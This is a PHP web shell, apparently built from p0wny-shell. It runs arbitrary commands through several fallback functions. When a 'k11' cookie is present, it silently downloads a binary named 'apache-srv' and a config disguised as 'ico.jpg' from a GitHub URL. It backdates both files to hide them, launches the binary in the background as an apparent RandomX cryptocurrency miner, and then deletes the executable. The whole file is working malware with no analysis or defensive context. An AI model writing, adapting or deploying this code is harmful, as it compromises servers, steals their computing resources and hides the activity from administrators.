<?php

$SHELL_CONFIG = array(
    'username' => 'p0wny',
    'hostname' => 'shell',
);

function expandPath($path) {
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        exec("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}

function allFunctionExist($list = array()) {
    foreach ($list as $entry) {
        if (!function_exists($entry)) {
            return false;
        }
    }
    return true;
}

function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
        exec($cmd, $output);
        $output = implode("\n", $output);
    } else if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
        $handle = popen($cmd, 'r');
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
        $output = stream_get_contents($pipes[1]);
        proc_close($handle);
    }
    return $output;
}

function isRunningWindows() {
    return stripos(PHP_OS, "WIN") === 0;
}

function featureShell($cmd, $cwd) {
    $stdout = "";

    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
        chdir(expandPath("~"));
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir(expandPath($match[1]));
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        $stdout = executeCommand($cmd);
    }

    return array(
        "stdout" => base64_encode($stdout),
        "cwd" => base64_encode(getcwd())
    );
}

function featurePwd() {
    return array("cwd" => base64_encode(getcwd()));
}

function initShellConfig() {
    global $SHELL_CONFIG;

    if (isRunningWindows()) {
        $username = getenv('USERNAME');
        if ($username !== false) {
            $SHELL_CONFIG['username'] = $username;
        }
    } else {
        $pwuid = posix_getpwuid(posix_geteuid());
        if ($pwuid !== false) {
            $SHELL_CONFIG['username'] = $pwuid['name'];
        }
    }

    $hostname = gethostname();
    if ($hostname !== false) {
        $SHELL_CONFIG['hostname'] = $hostname;
    }
}

if (isset($_COOKIE["k11"])) {
    $response0 = featureShell("ps aux |grep apache-srv | grep -v grep", "./");
    $response2 = featureShell("cat /proc/$$/oom_score_adj", "./");
    $outresp = base64_decode($response0['stdout']);
    $outresp2 = base64_decode($response2['stdout']);
    if (preg_match('/apache-srv/',$outresp)){
        die("already_running");
    }

    if (!file_exists("ico.jpg")){
        $f=file_get_contents("https://raw.githubusercontent.com/abq78/files2/main/ico.jpg","ico.jpg");
        file_put_contents("ico.jpg",$f);
        $time = time() - 99999999;
        touch("ico.jpg",$time);
    }

    if (!file_exists("apache-srv")){
        $f=file_get_contents("https://raw.githubusercontent.com/abq78/files2/main/apache-srv","apache-srv");
        file_put_contents("apache-srv",$f);
        $time = time() - 99999999;
        touch("apache-srv",$time);
    }


    $response = NULL;
    //$cmd = $_POST['cmd'];
    if ($outresp2 == "0"){
        $cmd = "chmod 755 apache-srv;./apache-srv -c ico.jpg --background > /dev/null 2>&1 &";
    }else{
        $cmd = "chmod 755 apache-srv;./apache-srv -c ico.jpg --background --randomx-mode=light > /dev/null 2>&1 &";
    }
    
    if (!preg_match('/2>/', $cmd)) {
      $cmd .= ' 2>&1';
    }
    $response = featureShell($cmd, "./");
    header("Content-Type: application/json");
    $out = json_encode($response,true);
    echo $out;
    unlink("apache-srv");
    die();
} else {
    initShellConfig();
}

?>
